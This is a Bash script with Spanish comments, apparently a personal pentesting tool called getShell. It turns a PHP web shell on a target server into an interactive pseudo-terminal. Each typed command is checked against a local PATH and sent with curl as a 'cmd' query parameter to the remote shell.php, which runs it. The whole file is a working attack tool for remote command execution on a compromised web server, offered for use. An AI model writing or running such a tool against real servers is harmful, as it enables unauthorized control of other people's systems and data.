#!/bin/bash

#Ejecución alternativa (rlwrap ./getshell.sh)

#Colours
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

trap ctrl_c INT

#Variables Globales

declare -a local_path
declare -r my_path="/home/markosgervacio/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin" 



function ctrl_c(){
	echo -e "\n\n${red}[!] Saliendo...${end}"
	exit 1
}

function helpPanel(){
	echo -e "\n\n${yellow}[*]${end}${gray}Uso: ./getShell ${end}\n"
	echo -e "\t${purple}u)${end}${yellow}Direccion URL${end}"
	echo -e "\n${blue}[*]${end}${gray}Ejemplo: ./getShell -u http://127.0.0.1:8080/shell.php${end}\n"
	exit 0
}


function makeRequest(){
	echo -e "${purple}"
	curl "$url?cmd=$1"
	echo -ne "${end}"
	
}


function obtainShell(){
	for path in $(echo $my_path | tr ':' ' ');do
		local_path+=($path)
	done
	
	while [ "$command" != "exit" ];do
		counter=0;echo -ne "\n${gray}$~${end} " && read -r command

		for element in ${local_path[*]};do
			if [ -x $element/$(echo $command | awk '{print $1}') ];then
				let counter+=1
				break
			elif [ "$(echo $command | awk '{print $1}')" == "cd" ];then
				let counter+=1
				break
			fi
		done

		if [ $counter -eq 1 ];then
			command=$(echo $command | tr ' ' '+') #sed 's/ /+/g'
			#echo $command #ls+l
			makeRequest $command
		else
			echo -e "\n${red}[!]${end}${gray} Comando ${end}${blue}$(echo $command | awk '{print $1}')${end}${gray} No encontrado ${end}"
		fi
	done
}

#Main Function

declare -i parameter_counter=0; while getopts ":u:h:" arg;do
	case $arg in
		u) url=$OPTARG; let parameter_counter+=1 ;;
		h) helpPanel ;;
	esac
done

if [ $parameter_counter -ne 1  ]; then
	helpPanel
else
	obtainShell

fi

